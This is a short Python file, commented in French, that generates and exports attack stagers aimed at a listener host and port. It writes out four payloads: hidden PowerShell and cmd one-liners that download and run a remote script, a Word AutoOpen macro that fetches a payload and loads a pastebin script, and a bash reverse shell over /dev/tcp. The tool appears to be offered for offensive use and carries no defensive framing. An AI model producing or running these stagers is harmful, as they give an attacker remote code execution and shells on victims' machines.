import datetime
import os

def generate_stager(stager_type, lhost, lport):
    """
    Génère un stager Empire/Metasploit (one-liner, macro, powershell, etc).
    """
    stagers = {
        'powershell': f"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')\"",
        'cmd': f"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')",
        'macro': f"Sub AutoOpen()\n  Dim xHttp As Object\n  Set xHttp = CreateObject(\"MSXML2.XMLHTTP\")\n  xHttp.Open \"GET\", \"http://{lhost}:{lport}/payload.ps1\", False\n  xHttp.Send\n  GetObject(\"script:https://pastebin.com/raw/abc123\")\nEnd Sub",
        'unix': f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    }
    return stagers.get(stager_type, f"Type non supporté: {stager_type}")

def export_stager(payload, stager_type, lhost, lport, export_base):
    # Organisation : exports/<date>/stagers/
    date_dir = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "stagers")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    with open(export_base + '.txt', 'w', encoding='utf-8') as f:
        f.write(payload)
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Stager {stager_type}\n\n")
        f.write(f"**LHOST** : {lhost}\n**LPORT** : {lport}\n\n")
        f.write(f"```{stager_type}\n{payload}\n```")
